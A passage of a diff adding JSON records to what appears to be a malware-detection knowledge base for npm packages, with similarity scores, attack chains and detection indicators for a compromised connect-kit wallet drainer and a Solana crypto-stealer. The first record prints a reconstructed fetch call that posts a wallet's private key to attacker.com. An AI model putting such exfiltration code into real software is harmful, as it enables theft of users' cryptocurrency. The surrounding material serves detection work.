+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_085475/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5463269352912903,
+              "code_similarity": 0.4717780351638794,
+              "behavior_similarity": 0.6208758354187012,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code (reconstructed based on typical wallet-drainer behavior)\nfetch('https://attacker.com/steal', {\n  method: 'POST',\n  body: JSON.stringify({\n    privateKey: wallet.privateKey,\n    address: wallet.address\n  })\n});",
+                "code_behavior": "At runtime, when the wallet is accessed, the code reads the user's wallet private key and address, then sends this sensitive data via an outbound HTTPS POST request to a hardcoded attacker-controlled domain, resulting in credential exfiltration and enabling theft of user assets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code directly accesses sensitive wallet credentials (privateKey, address) and transmits them to an external, hardcoded domain controlled by the attacker. This behavior is a clear indicator of credential theft and is not required for legitimate wallet operations.",
+                  "violated_expectations": "Legitimate wallet packages should never access or transmit private keys or wallet secrets over the network, especially to unknown or untrusted domains. Such sensitive data must remain local and protected.",
+                  "similar_legitimate_use": "Legitimate packages may send anonymized telemetry or usage statistics, but never private keys, wallet addresses, or other secrets. Any code sending private keys externally is inherently malicious.",
+                  "key_indicators": [
+                    "Direct access to wallet.privateKey and wallet.address in code",
+                    "Outbound HTTPS POST request to a hardcoded, untrusted domain",
+                    "Sensitive credential data included in network payload",
+                    "Network activity triggered during wallet operations"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when wallet functionality is accessed)",
+                  "file_location": "main package code (e.g., index.js or injected module)",
+                  "required_permissions": [
+                    "network (outbound HTTPS requests)",
+                    "access to wallet object (privateKey, address)",
+                    "read environment variables (if wallet credentials are stored there)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (latest version at time of compromise)",
+                  "why_malicious": "The package was compromised to include wallet-draining code that exfiltrates users' cryptocurrency wallet private keys and addresses to an attacker-controlled server, enabling unauthorized access and theft of assets."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates the compromised connect-kit package in their crypto frontend application.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present in the application."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application runs and the wallet functionality is accessed, the malicious code executes and collects wallet credentials.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Wallet private key and address are exfiltrated to the attacker's server."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker receives the exfiltrated private keys and can use them to drain user wallets.",
+                    "implemented_by": [],
+                    "leads_to": "Theft of user assets (final goal)."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to wallet private keys or sensitive credentials in code",
+                    "Outbound network requests sending sensitive data (e.g., privateKey, address) to hardcoded or untrusted domains",
+                    "Unexpected runtime network activity in wallet-related npm packages, especially during wallet access"
+                  ],
+                  "file_indicators": [
+                    "Modified main entry point (e.g., index.js) containing new or obfuscated network request code",
+                    "References to sensitive variables such as wallet.privateKey or wallet.address in network payloads"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with the legitimate connect-kit package",
+                    "Connections to newly registered, suspicious, or hardcoded domains (e.g., attacker.com/steal)"
+                  ],
+                  "how_to_detect": "Use static analysis to identify wallet-related npm packages that access private keys or sensitive credentials and include them in outbound network requests. Flag any code introducing new or obfuscated network requests to hardcoded or untrusted domains. Monitor for unexpected changes in package entry points or injected code that performs credential exfiltration. Correlate runtime network activity with wallet access events to detect unauthorized data transmission."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5414139628410339,
+              "code_similarity": 0.46378928422927856,
+              "behavior_similarity": 0.6190386414527893,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
